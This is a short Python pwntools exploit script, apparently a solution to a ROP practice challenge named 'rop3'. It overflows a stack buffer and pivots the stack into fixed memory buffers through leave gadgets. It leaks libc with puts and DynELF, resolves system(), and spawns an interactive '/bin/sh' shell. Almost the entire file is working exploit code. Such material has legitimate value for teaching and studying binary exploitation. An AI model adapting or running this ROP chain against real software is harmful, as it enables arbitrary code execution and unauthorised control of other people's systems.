#!/usr/bin/env python

from pwn import *

context.arch='amd64'

r = process('./rop3')

pop_rdi = 0x4006a3
pop_rbp = 0x400560
leave = 0x40063e
func_gets = 0x4004d0
func_puts = 0x4004b0
#閒置空間，只有用前段
buf1 = 0x602000 - 0x200
buf2 = 0x602000 - 0x400
buf3 = 0x602000 - 0x600

r.send('A'*40 + p64(pop_rdi) + p64(buf1) + p64(func_gets) + p64(pop_rbp) + p64(buf1 - 8) + p64(leave) + '\n')
r.recvline()

def do_rop(payload):
    global buf1, buf2
    assert '\n' not in payload
    r.send(payload + p64(pop_rdi) + p64(buf2) + p64(func_gets) + p64(pop_rbp) + p64(buf2 - 8) + p64(leave) + '\n')
    # sleep(0.1)
    buf1,buf2 = buf2,buf1

def leak(address):
    do_rop(p64(pop_rdi) + p64(address) + p64(func_puts))
    # sleep(0.1)
    x = r.recv()[:-1] + '\x00'
    # print hex(address), enhex(x)
    return x

d = DynELF(leak, pop_rdi)
libc_system = d.lookup('system', 'libc')

print 'system =', hex(libc_system)

do_rop(p64(pop_rdi) + p64(buf3) + p64(func_gets))
r.send("/bin/sh\n")

do_rop(p64(pop_rdi) + p64(buf3) + p64(libc_system))

r.interactive()
